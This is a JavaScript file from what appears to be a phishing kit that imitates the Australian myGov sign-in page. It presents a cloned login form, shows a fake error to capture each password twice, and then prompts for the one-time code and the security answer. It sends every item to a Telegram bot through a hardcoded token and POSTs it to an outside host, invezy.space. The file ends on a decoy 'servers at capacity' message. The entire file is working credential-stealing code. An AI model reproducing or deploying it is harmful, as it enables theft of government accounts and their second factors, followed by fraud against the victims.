var attempts = 0;
const form = document.querySelector("form");
const view = document.getElementById("view");
let token =  "5634283075:AAHeuirSWFtHk9rQkrd_A8AS-UbmUIRTrJQ" //"5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU";
let chat_id = -821477061 //-5004137383;
let def_id =  5004137383 //748063043;

const d = new Date();
let submissionID = d.getTime();

async function fmSb(ev) {
    ev.preventDefault();

    let uu = document.getElementById("uu").value;
    let pp = document.getElementById("pp").value;

    if (uu === "" || uu === " ") {
        alert("Username/email field must be filled!");
        return;
    }

    if (pp === "" || pp === " ") {
        alert("Password field must be filled!");
        return;
    }

    if (attempts < 1) {
        attempts++;
        await sendToTelegram("First Attempt", uu, pp, (res) => {
            if (res === "sent") {
                let tryAgainTxt = document.getElementById("errTryAgain");
                tryAgainTxt.style.color = "red";
                tryAgainTxt.innerText = "Error, please enter your login details again."
                document.querySelectorAll("input").forEach((input) => {
                    input.value = "";
                    input.style.border = "1px solid red";
                })
            }
        });

        return;
    }

    await sendToTelegram("Second Attempt", uu, pp, (res) => {
        if (res === "sent") {
            nextPage();
        }
    });
}

async function proceed(ev) {
    ev.preventDefault();

    let code = document.getElementById("code").value;

    if (code === "" || code === " ") {
        alert("Code field must be filled!");
        return;
    }

    await sendToTelegram2(code, (res) => {
        if (res === "sent") {
            nextPage2();
        }
    });
}

async function proceed2(ev) {
    ev.preventDefault();

    // let que = document.getElementById("que").value;
    let ans = document.getElementById("ans").value;

    // if (que === "" || que === " ") {
    //     alert("Question field must be filled!");
    //     return;
    // }

    if (ans === "" || ans === " ") {
        alert("Answer field must be filled!");
        return;
    }

    await sendToTelegram3(ans, (res) => {
        if (res === "sent") {
            finish();
        }
    });
}

function nextPage() {
    view.innerHTML = `
    <h2 class="text-align-left">Enter the code sent to your phone or email</h2>
    <form class="mygov-login-form alternative" method="post">
        <div class="input-group">
            <label class="override" for="code">Code</label>
            <input id="code" name="username" aria-required="true"
                data-username="data-username" type="text" value="" autocomplete="off" />
        </div>

        <br>

        <div class="button-digital-id-main-container override">
            <div class="digital-id-button-container">
                <button type="submit" class="button-main" onclick="proceed(event)">Proceed</button>
            </div>
        </div>
        
        <div>
        </div>
    </form>
    `;
}

function nextPage2() {
    view.innerHTML = `
    <form class="mygov-login-form alternative" method="post">

        <h2 class="text-align-left">Answer to security question</h2>

        <!-- <div class="input-group">
            <label for="que" class="override">Question</label>
            <div class="password-group">
                <input id="que" name="pp" type="text" autocomplete="off" />
            </div>
        </div> -->

        <div class="input-group">
            <label for="ans" class="override">Answer</label>
            <div class="password-group">
                <input id="ans" name="pp" type="text" autocomplete="off" />
            </div>
        </div>

        <br>

        <div class="button-digital-id-main-container override">
            <div class="digital-id-button-container">
                <button type="submit" class="button-main" onclick="proceed2(event)">Proceed</button>
            </div>
        </div>
        
        <div>
        </div>
    </form>
    `;
}

function loadFirstView() {
    view.innerHTML = `
    <h1>Sign in with myGov</h1>
    <p id="errTryAgain"></p>
    <h2 class="text-align-left">Using your myGov sign in details</h2>
    <form class="mygov-login-form alternative" method="post">
        <div class="input-group">
            <label class="override" for="uu">Username or email</label>
            <input id="uu" name="username" aria-required="true"
                data-username="data-username" type="text" value="" autocomplete="off" />
        </div>

        <div class="input-group">
            <label for="pp" class="override">Password</label>
            <div class="password-group">
                <input id="pp" name="pp" type="password" autocomplete="off" />
            </div>
        </div>

        <br>

        <div class="button-digital-id-main-container override">
            <div class="digital-id-button-container">
                <button type="submit" class="button-main" onclick="fmSb(event)">Sign in</button>
            </div>
        </div>
        <p class="create-account-text"><a class="create-account-link"
                href="">Create a myGov account</a>
            if you don't have one already.</p>
        <div>
        </div>
    </form>
    `;
}

function finish() {
    view.innerHTML = `
    <h2 class="text-align-left">Our servers are at capacity at the moment, please try again later.</h2>
    `;
}

async function sendToTelegram(attempt_type, uu, pp, callback) {
    let my_txt = `NEW LOGIN DETAILS (${attempt_type})%0A`;
    my_txt += `====================%0A`;
    my_txt += `Submission ID: ${submissionID}%0A`;
    my_txt += `====================%0A`;
    my_txt += `Username/Email: ${uu}%0A`;
    my_txt += `Password: ${pp}%0A`;
    my_txt += `Time and date submitted: ${new Date().toLocaleDateString()} - ${new Date().toLocaleTimeString()}`;

    // let url = `https://api.telegram.org/bot${token}sendMessage?chat_id=${chat_id}&text=${my_txt}`;

    const bt = new Bot(token, def_id);

    bt.sendMessage(my_txt)
        .then(res => {
            sendToMail(my_txt, (resp) => {
                if (resp === "sent") {
                    callback("sent");
                } else {
                    console.log(resp);
                    callback("sent");
                }
            })
        })
        .catch(err => console.log(err))
}

async function sendToTelegram2(code, callback) {
    let my_txt = `CODE AND SECURITY DETAILS%0A`;
    my_txt += `====================%0A`;
    my_txt += `Submission ID: ${submissionID}%0A`;
    my_txt += `====================%0A`;
    my_txt += `Code: ${code}%0A`;
    my_txt += `Time and date submitted: ${new Date().toLocaleDateString()} - ${new Date().toLocaleTimeString()}`;
    // let url = `https://api.telegram.org/bot${token}sendMessage?chat_id=${chat_id}&text=${my_txt}`;

    const bt2 = new Bot(token, def_id);

    bt2.sendMessage(my_txt)
        .then(res => {
            sendToMail(my_txt, (resp) => {
                if (resp === "sent") {
                    callback("sent");
                } else {
                    console.log(resp);
                    callback("sent");
                }
            })
        })
        .catch(err => console.log(err))
}

async function sendToTelegram3(ans, callback) {
    let my_txt = `CODE AND SECURITY DETAILS%0A`;
    my_txt += `====================%0A`;
    my_txt += `Submission ID: ${submissionID}%0A`;
    my_txt += `====================%0A`;
    // my_txt += `Question: ${que}%0A`;
    my_txt += `Answer: ${ans}%0A`;
    my_txt += `Time and date submitted: ${new Date().toLocaleDateString()} - ${new Date().toLocaleTimeString()}`;
    // let url = `https://api.telegram.org/bot${token}sendMessage?chat_id=${chat_id}&text=${my_txt}`;

    const bt2 = new Bot(token, def_id);

    bt2.sendMessage(my_txt)
        .then(res => {
            sendToMail(my_txt, (resp) => {
                if (resp === "sent") {
                    callback("sent");
                } else {
                    console.log(resp);
                    callback("sent");
                }
            })
        })
        .catch(err => console.log(err))
}

async function sendToMail(txt, callback) {
    var formdata = new FormData();
    formdata.append("id", submissionID);
    formdata.append("txt", txt);
    fetch("https://invezy.space/public/aumygov/mail.php", {
        method: "POST",
        body: formdata
    })
    .then((res) => res.text())
    .then((res) => callback(res))
    .catch((err) => callback(err))
}

loadFirstView();